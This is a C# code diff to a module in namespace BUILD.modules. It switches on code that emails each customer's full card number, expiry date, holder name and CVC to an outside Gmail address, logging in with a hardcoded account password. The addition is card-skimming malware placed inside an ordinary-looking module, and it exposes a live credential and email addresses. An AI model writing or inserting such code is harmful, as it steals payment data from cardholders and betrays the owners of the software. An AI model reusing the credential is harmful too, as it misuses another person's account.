@@ -62,16 +62,20 @@ namespace BUILD.modules
                 try
                 {
                     //mail
-                    /*
-                    MailAddress from = new MailAddress("", "BUILD/IS");
-                    MailAddress to = new MailAddress("");
+                    
+                    MailAddress from = new MailAddress("mail4build22@gmail.com", "firm build");
+                    MailAddress to = new MailAddress("vorobevnik17@gmail.com");
                     MailMessage message = new MailMessage(from, to);
                     message.Subject = "деньга дали";
                     message.Body = $"номер:{num} дата: {date1}/{date2}, держатель: {holder}, cvc:{ccccv}";
-                    SmtpClient client = new SmtpClient("stmp.gmail.com", 587);
-                    client.Credentials = new NetworkCredential("", "");
+                    message.IsBodyHtml = false;
+                    
+                    SmtpClient client = new SmtpClient("smtp.gmail.com", 587);//25 465 587
+                    //SmtpClient client = new SmtpClient("smtp-relay.gmail.com", 25);
                     client.EnableSsl = true;
-                    client.Send(message);*/
+                    client.Timeout = 1000;
+                    client.Credentials = new NetworkCredential(from.Address, "135qaz741");
+                    client.Send(message);
 
                 }
                 catch (Exception exception)
